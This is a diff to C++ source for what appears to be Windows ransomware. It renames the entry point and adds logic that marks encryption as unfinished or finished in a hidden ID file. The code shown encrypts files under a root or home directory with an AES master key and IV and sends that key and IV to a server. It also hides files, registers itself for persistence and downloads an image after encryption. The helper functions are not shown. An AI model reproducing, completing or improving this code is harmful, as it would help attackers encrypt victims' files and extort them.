@@ -11,10 +11,9 @@ using std::string;
 void encrypt(string path, const PBYTE masterIV, const PBYTE masterKey);
 
 string get_username();
-
-void send();
+void test();
 void notify();
-DWORD getKeyHandle(PBYTE key, BCRYPT_KEY_HANDLE& keyHandle, BCRYPT_ALG_HANDLE& aesHandle);
+static DWORD getKeyHandle(PBYTE key, BCRYPT_KEY_HANDLE& keyHandle, BCRYPT_ALG_HANDLE& aesHandle);
 DWORD generateKeyAndIV(PBYTE* iv, PBYTE* key);
 Status sendIVAndKeyToServer(PBYTE masterIV, PBYTE masterKey, PBYTE id);
 void changeHiddenFileState(bool state);
@@ -26,7 +25,7 @@ void doRestart();
 void makeFileHidden(string path);
 void RegisterProgram();
 
-int main(int argc, char* argv[]) {
+int encryption_main( bool fromStart) {
 //	crypt_data* d = generatekey();//TODO also move to encrypt
 	PBYTE masterIV = nullptr, masterKey = nullptr;
 	string path = ROOT_DIR;
@@ -35,16 +34,17 @@ int main(int argc, char* argv[]) {
 	RegisterProgram();
 #endif
 	changeHiddenFileState(false);
-	download_jpeg(pathToImage, R"(https://i.redd.it/ep77fc6dceey.jpg)");
-	makeFileHidden(pathToImage);
+
 	string pathToID = get_path_to_id();
 
 	//TODO set SquanchedID and IMAGE invisible
 	std::ofstream IDFile;
+	std::ifstream readIDFile;
 	PBYTE id = nullptr;
 	HANDLE hCurrentProcess = nullptr;
 	HANDLE hJob = nullptr;
 	std::vector<string> processed;
+	string fileRead;
 	/* let's begin*/
 	Status status = generateKeyAndIV(&masterIV, &masterKey);
 	if (!NT_SUCCESS(status))
@@ -85,18 +85,18 @@ int main(int argc, char* argv[]) {
 //	masterKeyIVFile.close();
 	
 	
-	IDFile.open(pathToID, std::ios::binary);
+	IDFile.open(pathToID, std::ios::out);
 	if(!IDFile.is_open())
 	{
 		std::cout << "Failed to open file: " << GetLastError() << std::endl;
 	}
+	IDFile << NOT_FINISHED_ENCRYPTION;
 	IDFile.write((char*)id, ID_LEN);
 	IDFile.close();
 	makeFileHidden(pathToID);
 
 	
 
-	changeHiddenFileState(true);
 	
 #ifndef DEBUG
 	string path = get_home();
@@ -108,7 +108,28 @@ int main(int argc, char* argv[]) {
 	{
 		remove(path);
 	}
+	readIDFile.open(pathToID, std::ios::in);
+	if (!readIDFile.is_open())
+	{
+		std::cout << "Failed to open file: " << GetLastError() << std::endl;
+	}
+	fileRead = string((std::istreambuf_iterator<char>(readIDFile)), std::istreambuf_iterator<char>());
 
+	fileRead[0] = FINISHED_ENCRYPTION;
+	readIDFile.close();
+
+	IDFile.open(pathToID,  std::ios::out);
+	if (!IDFile.is_open())
+	{
+		std::cout << "Failed to open file: " << GetLastError() << std::endl;
+	}
+	IDFile << fileRead;
+	IDFile.close();
+
+	
+	download_jpeg(pathToImage, R"(https://i.redd.it/ep77fc6dceey.jpg)");
+	makeFileHidden(pathToImage);
+	changeHiddenFileState(true);
 //#ifdef DEBUG
 //	std::cout << "Username: " << get_username() << std::endl;
 //	encrypt(d, "./README.md");
